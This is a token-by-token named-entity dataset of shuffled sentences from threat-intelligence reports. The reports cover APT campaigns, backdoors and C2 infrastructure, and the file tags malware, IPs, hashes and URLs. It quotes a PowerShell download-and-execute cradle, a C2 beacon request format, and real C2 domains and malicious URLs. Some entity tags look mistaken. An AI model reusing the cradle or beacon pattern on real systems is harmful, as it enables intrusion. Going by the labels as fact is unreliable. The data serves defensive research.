and	O
sent	O
.	O

When	O
written	O
to	O
disk	O
,	O
the	O
data	O
is	O
RC4	O
encrypted	O
with	O
a	O
key	O
of	O
either	O
'	O
CYBERGATEPASS	O
'	O
or	O
'	O
CONFIG	O
'	O
for	O
the	O
versions	O
we	O
have	O
analyzed	O
.	O

POST	O
/NfLog/Nfile.asp	O
HTTP/1.1	O
Accept	O
:	O
*/*	O
User-Agent	O
:	O
Mozilla/5.0	O
(	O
compatible	O
;	O
MSIE	O
7.0;Windows	O
NT	O
5.1	O
)	O
Host	O
:	O
Content-Length	O
:	O
0	O
Cache-Control	O
:	O
no-cache	O
POST	O
/NfLog/NfStart.asp?ClientId=	O
{	O
LocalIP	O
}	O
%	O
20	O
<	O
49d0	O
>	O
%	O
20	O
{	O
Ex-ternalIP	O
}	O
&	O
Nick=	O
{	O
Identifier	O
}	O
&	O
d	O
-	O
time=T:8-6-0-53	O
HTTP/1.1	O
Accept	O
:	O
*/*	O
Use-Agent	O
:	O
Mozilla/4.0	O
(	O
compatible	O
;	O
MSIE	O
6.0	O
;	O
Windows	O
NT	O
5.0	O
;	O
.NET	O
CLR	O
1.1.4322	O
)	O
Host	O
:	O
Content-Length	O
:	O
36	O
Cache-Control	O
:	O
no-cache	O
Cookie	O
:	O
ASPSESSIONIDACCARCDD=OKNPG-CKDLEKEHBOHIHLCOMHD	O

Winrar[.]be	O
site	O
with	O
'	O
recommended	O
link	O
'	O
leading	O
to	O
malicious	O
ralrab[.]com	O

Protection	O

125.214.195.17	B-ip.unknown
196.29.166.218	B-ip.unknown

Location	O
C.	O
is	O
where	O
the	O
result	O
of	O
each	O
command	O
is	O
sent	O
back	O
to	O
the	O
C	O
&	O
C	O
server	O
.	O

This	O
email	O
was	O
later	O
forwarded	O
on	O
Oct	O
24th,2016	O
from	O
a	O
spoofed	O
email	O
id	O
which	O
is	O
associated	O
with	O
Thailand	O
Indian	O
embassy	O
to	O
various	O
email	O
recipients	O
connected	O
to	O
the	O
Indian	O
Ministry	O
of	O
External	O
Affairs	O
as	O
shown	O
in	O
the	O
below	O
screen	O
shot	O
.	O

The	O
publication	O
of	O
threat	O
information	O
allows	O
us	O
to	O
draw	O
links	O
between	O
different	O
campaigns	O
,	O
tools	O
and	O
malware	O
but	O
we	O
need	O
to	O
be	O
careful	O
about	O
which	O
links	O
we	O
consider	O
to	O
be	O
significant	O
and	O
ensure	O
we	O
're	O
confident	O
in	O
how	O
information	O
that	O
's	O
publically	O
available	O
was	O
derived	O
.	O

reconnaissance	O
associated	O
with	O
the	O
revolution	O
in	O
Ukraine	O
.	O

This	O
creates	O
a	O
quasi-capitalistic	O
system	O
that	O
pits	O
contractors	O
against	O
each	O
other	O
for	O
influence	O
with	O
the	O
Iranian	O
government	O
.	O

Of	O
particular	O
interest	O
is	O
an	O
embedded	O
,	O
custom	O
application	O
in	O
a	O
.data	O
section	O
that	O
is	O
responsible	O
for	O
loading	O
and	O
executing	O
executables	O
and	O
DLLs	O
from	O
inside	O
the	O
main	O
binary	O
.	O

An	O
additional	O
layer	O
used	O
to	O
thwart	O
detection	O
and	O
analysis	O
efforts	O
.	O

Command	O
Description	O

The	O
significance	O
of	O
the	O
username	O
Tranchulas	O
within	O
the	O
debug	O
path	O
of	O
the	O
winsocks.exe	B-malware.backdoor
binary	O
is	O
that	O
Tranchulas	O
is	O
a	O
Pakistani	O
information	O
security	O
consulting	O
company	O
with	O
offices	O
in	O
the	O
United	O
Kingdom	O
,	O
United	O
States	O
,	O
and	O
Pakistan	O
.	O

First	O
,	O
our	O
analysis	O
did	O
not	O
indicate	O
what	O
triggers	O
scada.exe	B-malware.unknown
to	O
run	O
.	O

https://github.com/a0rtega/pafish	B-url.normal

Analysis	O
revealed	O
the	O
possibility	O
that	O
some	O
user	O
data	O
would	O
be	O
recovered	O
as	O
a	O
side	O
benefit	O
to	O
the	O
forensic	O
analysis	O
process	O
.	O

When	O
the	O
AutoIt	O
script	O
is	O
extracted	O
we	O
see	O
that	O
important	O
variables	O
are	O
base64-encoded	O
.	O

The	O
TRITON	B-malware.infosteal
sample	O
Mandiant	O
analyzed	O
added	O
an	O
attacker-provided	O
program	O
to	O
the	O
execution	O
table	O
of	O
the	O
Triconex	B-malware.unknown
controller	O
.	O

We	O
have	O
had	O
only	O
a	O
partial	O
window	O
to	O
the	O
targets	O
of	O
these	O
semi-sophisticated	O
yet	O
highly	O
effective	O
attacks	O
.	O

Cyberkov	O
will	O
continue	O
investigating	O
Libyan	B-malware.infosteal
Scorpions	I-malware.infosteal
hacking	O
group	O
operating	O
in	O
Libya	O
and	O
will	O
update	O
this	O
report	O
with	O
a	O
follow-up	O
reports	O
regarding	O
any	O
future	O
cyber	O
activities	O
.	O

During	O
our	O
analysis	O
,	O
we	O
observed	O
ten	O
IP-addresses	O
used	O
by	O
the	O
Kimsuky	B-malware.drop
operators	O
.	O

This	O
second	O
task	O
ran	O
'	O
mshta.exe	O
'	O
every	O
50	O
minutes	O
which	O
launched	O
an	O
APT32-specific	O
backdoor	O
delivered	O
as	O
shellcode	O
in	O
a	O
PowerShell	O
script	O
,	O
configured	O
to	O
communicate	O
with	O
the	O
domains	O
blog.panggin[.]org	O
,	O
share.codehao[.]net	O
,	O
and	O
yii.yiihao126[.]net	O
.	O

Their	O
machine	O
is	O
running	O
Windows	O
7	O
Professional	O
Service	O
Pack	O
1	O
.	O

We	O
have	O
named	O
them	O
Retro	B-malware.backdoor
and	O
Collector	B-malware.backdoor
by	O
the	O
PDB	O
path	O
extracted	O
from	O
the	O
program	O
.	O

This	O
middle	O
tier	O
translated	O
intelligence	O
priorities	O
into	O
segmented	O
cyber	O
tasks	O
which	O
were	O
then	O
bid	O
out	O
to	O
multiple	O
contractors	O
.	O

Pussy	O
Riot	O
AUGUST	O
2015	O
APT28	O
targets	O
Russian	O
rockers	O
and	O
dissidents	O
Pussy	O
Riot	O
via	O
spear-phishing	O
emails	O
.	O

The	O
document	O
bears	O
the	O
filename	O
'	O
2018-PHIẾU	O
GHI	O
DANH	O
THAM	O
DỰ	O
TĨNH	O
HỘI	O
HMDC	O
2018.doc	O
,	O
'	O
which	O
translates	O
to	O

McAfee	O
Network	O
Security	O
Platform	O
McAfee	O
Network	O
Security	O
Platform	O
versions	O
with	O
Artemis	O
enabled	O
(	O
6.0.x	O
)	O
provide	O
coverage	O
for	O
this	O
malware	O
.	O

We	O
believe	O
the	O
infection	O
vector	O
for	O
all	O
of	O
the	O
attacks	O
involved	O
in	O
this	O
campaign	O
are	O
macro-based	O
documents	O
sent	O
as	O
an	O
email	O
attachment	O
.	O

d	O
.	O

Figure	O
14	O
:	O
China	B-malware.backdoor
Chopper	I-malware.backdoor
file	O
properties	O

In	O
June	O
2014	O
,	O
Arbor	O
Networks	O
published	O
an	O
article	O
describing	O
the	O
RIPTIDE	B-malware.backdoor
backdoor	O
and	O
its	O
C2	O
infrastructure	O
in	O
great	O
depth	O
.	O

C2	O
Domain	O
Information	O

In	O
this	O
campaign	O
,	O
the	O
threat	O
actor	O
's	O
tactics	O
,	O
techniques	O
and	O
procedures	O
(	O
TTPs	O
)	O
shifted	O
after	O
about	O
a	O
month	O
,	O
as	O
did	O
their	O
targets	O
.	O

The	O
algorithm	O
is	O
as	O
follows	O
:	O

However	O
,	O
various	O
provisions	O
of	O
the	O
accord	O
expire	O
at	O
different	O
times	O
over	O
the	O
next	O
25	O
years	O
,	O
with	O
some	O
expiring	O
as	O
soon	O
as	O
2025	O
.	O

66DDF27517985A75B2317231B46A6F62	B-hash
natco1.no-ip.net	B-url.cncsvr
US	O

Those	O
commands	O
(	O
103	O
,	O
104	O
and	O
105	O
)	O
correspond	O
to	O
the	O
following	O
list	O
of	O
commands	O
defined	O
in	O
the	O
malware	O
:	O
Each	O
number	O
corresponds	O
to	O
one	O
command	O
to	O
be	O
done	O
by	O
the	O
malware	O
.	O

On	O
execution	O
,	O
the	O
Java	O
code	O
downloaded	O
a	O
ZIP	O
archive	O
from	O
a	O
cloud	O
file	O
hosting	O
site	O
such	O
as	O
Google	O
Drive	O
,	O
Dropbox	O
,	O
or	O
Github	O
.	O

Cobalt	O
Strike	O
is	O
the	O
business	O
version	O
of	O
Armitage	O
which	O
is	O
the	O
penetration	O
testing	O
software	O
of	O
Metasploit	O
figure	O
interface	O
written	O
by	O
Java	O
.	O

Microphone	O
:	O
Captures	O
audio	O
conversations	O
.	O

27	O
,	O
2018	O
,	O
to	O
March	O
5	O
,	O
2018	O
)	O
used	O
a	O
new	O
variant	O
of	O
the	O
macro	O
that	O
does	O
not	O
use	O
VBS	O
for	O
PowerShell	O
code	O
execution	O
.	O

The	O
technique	O
of	O
hosting	O
malicious	O
code	O
in	O
a	O
university	O
site	O
(	O
legitimate	O
site	O
)	O
has	O
advantages	O
and	O
it	O
is	O
unlikely	O
to	O
trigger	O
any	O
suspicion	O
in	O
security	O
monitoring	O
and	O
also	O
can	O
bypass	O
reputation	O
based	O
devices	O
.	O

www.symantec.com	B-url.normal

Earlier	O
this	O
year	O
,	O
we	O
deployed	O
new	O
technologies	O
in	O
Kaspersky	O
Lab	O
products	O
to	O
identify	O
and	O
block	O
zero-day	O
attacks	O
.	O

Provider=	O
or	O
Driver=	O
-	O
Will	O
connect	O
using	O
the	O
OleDbConnection	O
class	O
.	O

Check	O
the	O
infographic	O
Homemade	O
Browser	O
Targeting	O
Banco	O
do	O
Brasil	O
Users	O
Campaign	O
Possibly	O
Connected	O
to	O
'	O
MuddyWater	O
'	O
Surfaces	O
in	O
the	O
Middle	O
East	O
and	O
Central	O
Asia	O
Cryptocurrency	O
Miner	O
Distributed	O
via	O
PHP	O
Weathermap	O
Vulnerability	O
,	O
Targets	O
Linux	O
Servers	O
Monero-Mining	B-malware.unknown
HiddenMiner	I-malware.unknown
Android	O
Malware	O
Can	O
Potentially	O
Cause	O
Device	O
Failure	O
Cryptocurrency-Mining	B-malware.unknown
Malware	O
:	O
2018	O
's	O
New	O
Menace	O
?	O

Another	O
characteristic	O
in	O
common	O
to	O
the	O
previous	O
files	O
is	O
that	O
,	O
this	O
one	O
is	O
written	O
in	O
Delphi	O
programming	O
language	O
,	O
like	O
also	O
the	O
four	O
initial	O
file	O
droppers	O
.	O

Visibly	O
,	O
this	O
RAT	B-malware.backdoor
was	O
used	O
alongside	O
the	O
Uroburos	B-malware.backdoor
rootkit	I-malware.backdoor
.	O

Our	O
latest	O
findings	O
give	O
an	O
updated	O
look	O
at	O
the	O
global	O
proliferation	O
of	O
FinSpy	B-malware.backdoor
.	O

Files	O
used	O
by	O
malware	O
:	O

The	O
malicious	O
macro	O
code	O
first	O
decodes	O
a	O
string	O
which	O
contains	O
a	O
reference	O
to	O
the	O
pastebin	O
url	O
.	O

Computer	O
name	O
(	O
'	O
ComputerNamePhysicalDnsFullyQualified	O
'	O
)	O
.	O

This	O
is	O
the	O
first	O
ever	O
Portuguese­speaking	O
targeted	O
attack	O
campaign	O
.	O

Several	O
techniques	O
are	O
employed	O
for	O
executing	O
the	O
PowerShell	O
code	O
:	O
If	O
command	O
starts	O
with	O
'	O
excel	O
'	O
,	O
then	O
it	O
leverages	O
DDEInitiate	O
Method	O
of	O
Excel.Appilcation	O
to	O
execute	O
the	O
code	O
:	O
If	O
the	O
command	O
starts	O
with	O
'	O
outlook	O
'	O
,	O
then	O
it	O
leverages	O
Outlook.Application	O
and	O
MSHTA	O
to	O
execute	O
the	O
code	O
:	O
If	O
the	O
command	O
starts	O
with	O
'	O
risk	O
'	O
,	O
then	O
execution	O
is	O
performed	O
through	O
DCOM	O
object	O
:	O
File	O
upload	O
functionality	O
.	O

It	O
is	O
worth	O
noting	O
that	O
this	O
email	O
appeared	O
to	O
have	O
been	O
sent	O
from	O
another	O
Taiwanese	O
Government	O
employee	O
,	O
implying	O
that	O
the	O
email	O
was	O
sent	O
from	O
a	O
valid	O
but	O
compromised	O
account	O
.	O

Last	O
accessed	O
August	O
30	O
,	O
2013.	O
accessed	O
August	O
30	O
,	O
2013	O
.	O

http://download.nai.com/products/mcafee-avert/aurora_stinger.exe	B-url.unknown

The	O
dropper	O
shares	O
the	O
same	O
decoding	O
functions	O
as	O
the	O
DLL	O
and	O
performs	O
some	O
modifications	O
on	O
the	O
DLL	O
that	O
will	O
be	O
described	O
later	O
.	O

Back	O
in	O
May	O
2011	O
,	O
Kaspersky	O
Lab	O
reported	O
the	O
website	O
was	O
being	O
leveraged	O
to	O
target	O
users	O
with	O
Flash	O
Exploits	O
.	O

In	O
the	O
case	O
of	O
'	O
Uranio2011	O
'	O
,	O
the	O
subdomain	O
is	O
simply	O
'	O
uranio	O
'	O
and	O
2011	O
represents	O
the	O
port	O
number	O
used	O
to	O
communicate	O
with	O
the	O
CnC	O
infrastructure	O
.	O

After	O
decryption	O
,	O
the	O
exploit	O
payload	O
is	O
loaded	O
and	O
triggered	O
to	O
allow	O
for	O
follow-on	O
code	O
execution	O
.	O

The	O
crawls	O
were	O
observed	O
throughout	O
our	O
data	O
period	O
from	O
early	O
March	O
continuing	O
right	O
through	O
to	O
the	O
end	O
of	O
April	O
,	O
suggesting	O
a	O
strong	O
,	O
persistent	O
interest	O
in	O
this	O
particular	O
site	O
.	O

The	O
attackers	O
created	O
persistence	O
using	O
Windows	O
'	O
registry	O
,	O
services	O
and	O
scheduled	O
tasks	O
.	O

Take	O
advantage	O
of	O
anti-phishing	O
features	O
offered	O
by	O
your	O
email	O
client	O
and	O
web	O
browser	O
.	O

In	O
addition	O
,	O
the	O
language	O
localization	O
settings	O
found	O
in	O
few	O
of	O
the	O
payloads	O
suggest	O
that	O
the	O
malware	O
authors	O
compiled	O
the	O
payloads	O
on	O
machines	O
with	O
Asian	O
languages	O
support	O
.	O

page	O
|	O
18	O

Working	O
in	O
concert	O
with	O
traditional	O
network	O
defense	O
appliances	O
that	O
currently	O
reside	O
in	O
our	O
client	O
's	O
proprietary	O
network	O
,	O
root9B	O
's	O
HUNT	O
platform	O
delivers	O
a	O
pro-active	O
defense	O
protection	O
capability	O
to	O
identify	O
,	O
pursue	O
,	O
and	O
mitigate	O
cyber	O
threats	O
.	O

The	O
campaign	O
was	O
highly	O
targeted	O
and	O
ran	O
deep	O
under	O
the	O
radar	O
.	O

That	O
,	O
combined	O
with	O
domain	O
registration	O
information	O
,	O
leads	O
to	O
at	O
least	O
one	O
potential	O
actor	O
,	O
Peng	O
Yong	O
.	O

unsigned	O
long	O
long	O
param_size	O
;	O

Function	O
EncryptAndSendData_sub_49393C	O
(	O
)	O

The	O
C++	O
structure	O
of	O
this	O
280kb+	O
dll	O
is	O
familiar	O
SPLM/CHOPSTICK	B-malware.backdoor
,	O
but	O
it	O
maintains	O
a	O
completely	O
different	O
cipher	O
for	O
decrypting	O
configuration	O
data	O
and	O
error	O
messages	O
,	O
etc	O
.	O

International	O
monitoring	O
groups	O
later	O
assessed	O
some	O
of	O
the	O
attacks	O
were	O
likely	O
to	O
have	O
come	O
from	O
inside	O
Russian	O
territory	O
.	O

•	O
A	O
common	O
quartermaster	O
or	O
supply-chain	O
for	O
their	O
malware	O
tools	O
.	O

The	O
malware	O
begins	O
by	O
creating	O
a	O
new	O
thread	O
from	O
the	O
DllMain	O
(	O
)	O
function	O
to	O
carry	O
out	O
its	O
malicious	O
activities	O
:	O
New	O
thread	O
created	O
in	O
the	O
malware	O
's	O
DllMain	O
(	O
)	O
function	O
.	O

$	O
2='-nop	O
-w	O
hidden	O
-exec	O
bypass	O
-c	O
'	O
IEX	O
(	O
New-Object	O
System.Net.Webclient	O
)	O
.DownloadString	O
(	O
'	O
'	O
https://goo(.)gl/cpT1NW''	O
)	O
'	O
'	O
;	O
if	O
(	O
[	O
IntPtr	O
]	O
:	O
:Size	O
-eq	O
8	O
)	O
{	O
$	O
3	O
=	O
$	O
env	O
:	O
SystemRoot	O
+	O
'	O
\syswow64\WindowsPowerShell\v1.0\powershell';iex	O
'	O
&	O
$	O
3	O
$	O
2	O
'	O
;	O
}	O
else	O
{	O
iex	O
'	O
&	O
powershell	O
$	O
2	O
'	O
;	O
}	O

<	O
Windows	O
Version	O
number	O
>	O
@	O
@	O
<	O
CPU	O
Architecture	O
(	O
2	O
for	O
x64	O
,	O
1	O
for	O
x86	O
)	O
>	O
?	O
?	O

Next	O
,	O
we	O
will	O
go	O
through	O
what	O
we	O
believe	O
is	O
the	O
development	O
life	O
cycle	O
and	O
feature-addition	O
mission	O
carried	O
out	O
by	O
this	O
developer	O
.	O

Symantec	O
reserves	O
the	O
right	O
to	O
make	O
changes	O
without	O
prior	O
notice	O
.	O

The	O
recently	O
published	O
FBI	O
flash	O
alert	O
#	O
A-000049-MW	O
,	O
cited	O
domain	O
names	O
previously	O
referenced	O
in	O
our	O
blog	O
as	O
being	O
related	O
to	O
an	O
actor	O
known	O
as	O
Deep	O
Panda	O
,	O
which	O
we	O
'll	O
get	O
to	O
in	O
a	O
minute	O
.	O

The	O
search	O
was	O
performed	O
for	O
the	O
hex	O
of	O
the	O
VBR	O
file	O
header	O
,	O
EB	O
52	O
90	O
4E	O
54	O
46	O
53	O
(	O
ëR	O
NTFS	O
)	O
.	O

Therefore	O
,	O
foreign	O
institutions	O
within	O
China	O
would	O
be	O
identified	O
as	O
coming	O
from	O
China	O
;	O
the	O
same	O
would	O
hold	O
true	O
for	O
all	O
countries	O
.	O

Even	O
this	O
oldest	O
main	O
component	O
does	O
however	O
use	O
XML	O
for	O
other	O
purposes	O
via	O
the	O
open-source	O
Pugi-XML	O
library	O
.	O

The	O
propensity	O
to	O
target	O
these	O
industries	O
possibly	O
demonstrates	O
an	O
interest	O
in	O
gaining	O
economic	O
competitive	O
advantage	O
in	O
the	O
region	O
through	O
the	O
acquisition	O
of	O
trade	O
secrets.using	O
the	O
appropriate	O
language	O
for	O
each	O
of	O
their	O
targets	O
in	O
the	O
phishing	O
emails–	O
such	O
as	O
Japanese	O
and	O
traditional	O
Chinese	O
(	O
mainly	O
used	O
in	O
Taiwan	O
)	O
.	O

T	O
he	O
findings	O
of	O
the	O
analysis	O
of	O
compromised	O
servers	O
and	O
the	O
attackers	O
'	O
activity	O
on	O
these	O
servers	O
are	O
as	O
follows	O
:	O
1	O
.	O

Above	O
:	O
Infrastructure	O
map	O
.	O

Given	O
the	O
similarities	O
in	O
methodology	O
and	O
targeting	O
we	O
consider	O
it	O
highly	O
likely	O
that	O
the	O
current	O
attack	O
malware	O
and	O
the	O
Hangover	O
infrastructures	O
are	O
related	O
.	O

In	O
the	O
digital	O
age	O
,	O
a	O
strategic	O
web	O
compromise	O
(	O
exploit	O
drive-by	O
)	O
has	O
become	O
a	O
key	O
weapon	O
of	O
choice	O
for	O
to	O
conduct	O
such	O
operations	O
.	O

This	O
was	O
the	O
second	O
public	O
Iranian	O
attack	O
campaign	O
on	O
an	O
American	O
business	O
,	O
where	O
the	O
response	O
called	O
for	O
speed	O
over	O
time	O
and	O
preparation	O
.	O

A	O
process	O
created	O
as	O
logged-in	O
user	O
.	O

In	O
our	O
never-ending	O
quest	O
to	O
spot	O
and	O
expose	O
the	O
nastiest	O
of	O
the	O
Internet	O
,	O
me	O
and	O
Mark	O
this	O
time	O
incidentally	O
stepped	O
into	O
a	O
targeted	O
attacks	O
campaign	O
apparently	O
directed	O
at	O
a	O
distributed	O
and	O
diversified	O
base	O
of	O
victims	O
.	O

From	O
late	O
2014	O
and	O
through	O
2016	O
,	O
FANCY	O
BEAR	O
X-Agent	B-malware.infosteal
implant	O
was	O
covertly	O
distributed	O
on	O
Ukrainian	O
military	O
forums	O
within	O
a	O
legitimate	O
Android	O
application	O
developed	O
by	O
Ukrainian	O
artillery	O
officer	O
Yaroslav	O
Sherstuk	O
.	O

이	O
밖에도	O
특정	O
산	O
업	O
분야에서	O
사용되는	O
시스템과	O
관련된	O
소프트웨어의	O
취약점을	O
이용한	O
공격을	O
진행했다	O
.	O

In	O
mid-February	O
this	O
year	O
,	O
we	O
discovered	O
a	O
new	O
Mac	O
sample	O
that	O
appeared	O
to	O
be	O
the	O
Mac	O
version	O
of	O
the	O
APT28	B-malware.infosteal
XAgent	I-malware.infosteal
component	O
.	O

In	O
the	O
implementation	O
process	O
,	O
Retro	B-malware.backdoor
disguised	O
fake	O
SSH	O
and	O
fake	O
zlib	O
,	O
intended	O
to	O
obfuscate	O
and	O
interfere	O
with	O
users	O
and	O
analysts	O
.	O

If	O
you	O
believe	O
that	O
you	O
are	O
being	O
targeted	O
it	O
pays	O
to	O
be	O
especially	O
cautious	O
when	O
downloading	O
files	O
over	O
the	O
Internet	O
,	O
even	O
from	O
links	O
that	O
are	O
purportedly	O
sent	O
by	O
friends	O
.	O

The	O
Komplex	B-malware.drop
Dropper	I-malware.drop
:	O
Its	O
main	O
functionality	O
is	O
to	O
drop	O
a	O
third	O
Komplex	B-malware.backdoor
component	O
:	O
the	O
final	O
payload	O
,	O
and	O
ensure	O
persistence	O
on	O
the	O
infected	O
system	O

The	O
embedded	O
binary	O
objects	O
in	O
the	O
lure	O
documents	O
contained	O
a	O
trailing	O
'	O
fdp.scr	O
'	O
in	O
their	O
names	O
with	O
a	O
special	O
invisible	O
Unicode	O
character	O
.	O

As	O
has	O
been	O
detailed	O
above	O
,	O
the	O
wipe	O
function	O
will	O
overwrite	O
data	O
within	O
the	O
Documents	O
and	O
Settings	O
folder	O
followed	O
by	O
the	O
System32	O
folder	O
,	O
and	O
then	O
it	O
will	O
start	O
the	O
physical	O
disk	O
access	O
and	O
start	O
the	O
wiping	O
at	O
the	O
disk	O
level	O
.	O

Hash	O

The	O
initial	O
process	O
,	O
AYRUNSC.exe	O
,	O
is	O
unable	O
to	O
work	O
correctly	O
and	O
will	O
therefore	O
exit	O
.	O

(	O
where	O
?	O
?	O
?	O

86BE5F0D2303FB4A8A8E297A53AC0026	B-hash
lokia.mine.nu	B-url.cncsvr

Figure	O
3	O
:	O
URL	O
Shortener	O
Redirects	O
to	O
Github	O
Link	O

Lacking	O
cryptographic	O
verification	O
facilitates	O
file	O
replacement	O
and	O
MitM	O
attacks	O
against	O
controlled	O
industrial	O
processes	O
.	O

The	O
modus	O
operandi	O
and	O
tools	O
served	O
as	O
behavioral	O
fingerprints	O
also	O
played	O
an	O
important	O
role	O
in	O
tying	O
Operation	O
Cobalt	O
Kitty	O
to	O
the	O
OceanLotus	O
Group	O
.	O

Protecting	O
Users	O
from	O
These	O
Threats	O

World	O
Anti-Doping	O
Agency	O
.	O

We	O
observed	O
several	O
different	O
spear-phishing	O
documents	O
that	O
drop	O
uniquely	O
named	O
payloads	O
.	O

Once	O
ANEL	B-malware.backdoor
enters	O
the	O
user	O
's	O
system	O
,	O
it	O
will	O
download	O
various	O
tools	O
that	O
could	O
be	O
used	O
for	O
malicious	O
purposes	O
,	O
including	O
password	O
retrieval	O
tools	O
as	O
well	O
as	O
malicious	O
mail	O
services	O
and	O
accessibility	O
tools	O
that	O
will	O
allow	O
it	O
to	O
gather	O
information	O
about	O
the	O
system	O
.	O

9/10	O

As	O
with	O
other	O
Animal	O
Farm	O
binaries	O
,	O
it	O
bears	O
the	O
mark	O
of	O
professional	O
and	O
experienced	O
developers	O
.	O

The	O
unique	O
ID	O
of	O
the	O
infected	O
machine	O
(	O
computer	O
name	O
+	O
HD	O
serial	O
3	O
.	O

This	O
verdict	O
was	O
supposed	O
to	O
correspond	O
to	O
the	O
known	O
file	O
mrxcls.sys	O
described	O
above	O
,	O
but	O
the	O
detected	O
file	O
's	O
name	O
and	O
checksum	O
were	O
different	O
!	O

This	O
path	O
was	O
confirmed	O
as	O
a	O
static	O
location	O
in	O
the	O
code	O
that	O
the	O
backdoor	O
would	O
use	O
to	O
copy	O
itself	O
.	O

5	O

Specific	O
examples	O
include	O
Shahid	O
Beheshti	O
University	O
(	O
SBU	O
)	O
and	O
the	O
Imam	O
Hossein	O
University	O
(	O
IHU	O
)	O
,	O
which	O
have	O
comprehensive	O
science	O
and	O
technology	O
departments	O
attracting	O
some	O
of	O
the	O
best	O
academic	O
talent	O
in	O
Iran	O
.	O

But	O
not	O
in	O
this	O
case	O
-	O
at	O
the	O
time	O
of	O
writing	O
,	O
the	O
gathered	O
user	O
information	O
variable	O
which	O
should	O
point	O
to	O
the	O
xmlrwbin.inc	O
filename	O
has	O
not	O
yet	O
been	O
initialized	O
,	O
causing	O
the	O
file	O
write	O
to	O
fail	O
.	O

They	O
share	O
similarities	O
in	O
code	O
–	O
take	O
a	O
look	O
at	O
the	O
function	O
that	O
generates	O
the	O
BOTID-value	O
,	O
for	O
example	O
:	O
The	O
BOTID-value	O
is	O
a	O
unique	O
value	O
generated	O
on	O
the	O
basis	O
of	O
the	O
hardware	O
parameters	O
of	O
infected	O
computer	O
,	O
and	O
it	O
's	O
used	O
by	O
attackers	O
for	O
computer	O
identification	O
.	O

Such	O
network	O
topology	O
is	O
typical	O
for	O
companies	O
and	O
enterprises	O
.	O

DFS.BAT	O
,	O
etc	O
)	O
.	O

The	O
following	O
pages	O
display	O
some	O
of	O
the	O
bait	O
information	O
the	O
new	O
files	O
contain	O
.	O

Command	O
Description	O

According	O
to	O
the	O
analysis	O
published	O
on	O
malwr.com	B-url.normal
,	O
this	O
file	O
was	O
originally	O
named	O
'	O
Israel	O
Homeland	O
Defense	O
Directory	O
2015	O
_Secured_.exe	O
'	O
and	O
,	O
once	O
executed	O
,	O
the	O
following	O
decoy	O
document	O
was	O
presented	O
:	O
The	O
initial	O
file	O
in	O
this	O
case	O
is	O
a	O
self­extracting	O
RAR	O
file	O
that	O
contains	O
three	O
components	O
,	O
including	O
a	O
decoy	O
document	O
(	O
in	O
this	O
case	O
,	O
the	O
PDF	O
shown	O
above	O
)	O
and	O
the	O
malware	O
.	O

Function	O
PreProcess_sub_44C1C0	O
(	O
)	O

In	O
late	O
May	O
2013	O
,	O
TCIRT	O
identified	O
a	O
malicious	O
file	O
hosted	O
at	O
http[:]//199.91.173[.]43/new_salary/salary_revision.scr	B-ip.unknown
(	O
Kansas	O
City	O
,	O
Missouri	O
)	O
.	O

System	O
Infected	O
:	O
Backdoor.Remexi	B-malware.backdoor
Activity	O
(	O
http://www.symantec.com/security_response/attacksignatures/detail.jsp?asid=28967	B-url.normal
)	O

Dropper	O
icon	O
Russian	O
social	O
media	O
site	O
from	O
where	O
icon	O
for	O
dropper	O
EXE	O
was	O
obtained	O

It	O
then	O
downloads	O
further	O
components	O
.	O

The	O
embedded	O
file	O
(	O
MD5	O
:	O
75D3D1F23628122A64A2F1B7EF33F5CF	O
)	O
,	O
later	O
written	O
to	O
disk	O
as	O
adobe.dat	O
,	O
is	O
obfuscated	O
with	O
a	O
double	O
XOR	O
loop	O
with	O
keys	O
0x2C	O
and	O
0x7B	O
(	O
this	O
is	O
mathematically	O
equivalent	O
to	O
a	O
single	O
XOR	O
loop	O
with	O
the	O
byte	O
key	O
0x57	O
)	O
.	O

Information	O
about	O
installed	O
Windows	O
updates	O
from	O
the	O
file	O

From	O
August	O
to	O
October	O
,	O
Guccifer	O
2.0	O
posted	O
several	O
additional	O
installments	O
of	O
what	O
appear	O
to	O
be	O
internal	O
DCCC	O
documents	O
on	O
'	O
his	O
'	O
WordPress	O
site	O
.	O

2016	O
.	O

Targeting	O
in	O
Hebrew	O
and	O
English	O

The	O
winrar[.]be	O
site	O
evaluated	O
what	O
'	O
recommended	O
'	O
package	O
a	O
visitor	O
may	O
need	O
based	O
on	O
browser	O
localization	O
and	O
processor	O
capability	O
,	O
and	O
accordingly	O
offered	O
up	O
appropriate	O
trojanized	O
versions	O
.	O

본	O
보고서에서는	O
안다리엘	O
공격	O
그룹의	O
공격	O
방식	O
,	O
주요	O
공격	O
사례를	O
살펴보고	O
,	O
공격	O
대상의	O
변화와	O
목적에	O
대해	O
알아본다	O
.	O

Both	O
pieces	O
of	O
malware	O
look	O
for	O
a	O
single	O
,	O
highly	O
specific	O
process	O
.	O

CWS	O
or	O
WSA	O
web	O
scanning	O
prevents	O
access	O
to	O
malicious	O
websites	O
and	O
detects	O
malware	O
used	O
in	O
these	O
attacks	O
.	O

However	O
,	O
this	O
key	O
is	O
also	O
scrambled	O
with	O
operation	O
XOR	O
0x13	O
followed	O
by	O
ROL	O
6	O
operation	O
applied	O
to	O
each	O
byte	O
.	O

We	O
have	O
seen	O
attempts	O
to	O
attack	O
various	O
companies	O
in	O
Russia	O
and	O
Ukraine	O
using	O
spearphishing	O
e-mails	O
that	O
have	O
malicious	O
attachments	O
consisting	O
of	O
.SCR	O
files	O
or	O
.RTF	O
exploits	O
.	O

Retrieves	O
the	O
server	O
time	O
Deletes	O
the	O
downloaded	O
victim	O
profiles	O
Deletes	O
the	O
connection	O
log	O
files	O
if	O
they	O
were	O
already	O
downloaded	O
Posts	O
a	O
job	O
to	O
kill	O
the	O
backdoor	O
Posts	O
a	O
job	O
for	O
DLL	O
injection	O
Changes	O
the	O
sleep	O
interval	O
Posts	O
a	O
job	O
for	O
command	O
shell	O
execution	O
Retrieves	O
the	O
job	O
results	O
and	O
deletes	O
the	O
posted	O
Posts	O
a	O
job	O
for	O
all	O
the	O
backdoors	O
connecting	O
to	O
the	O
server	O

Function	O
DecryptResources_sub_49F92C	O
(	O
)	O

Figure	O
4	O
:	O
Contents	O
of	O
HTA	O
File	O

Asset	O
owners	O
who	O
wish	O
to	O
defend	O
against	O
the	O
capabilities	O
demonstrated	O
in	O
the	O
incident	O
,	O
should	O
consider	O
the	O
following	O
controls	O
:	O
Where	O
technically	O
feasible	O
,	O
segregate	O
safety	O
system	O
networks	O
from	O
process	O
control	O
and	O
information	O
system	O
networks	O
.	O

This	O
variant	O
sends	O
the	O
system	O
info	O
to	O
the	O
controller	O
in	O
clear	O
text	O
for	O
the	O
login	O
request	O
.	O

It	O
was	O
n't	O
until	O
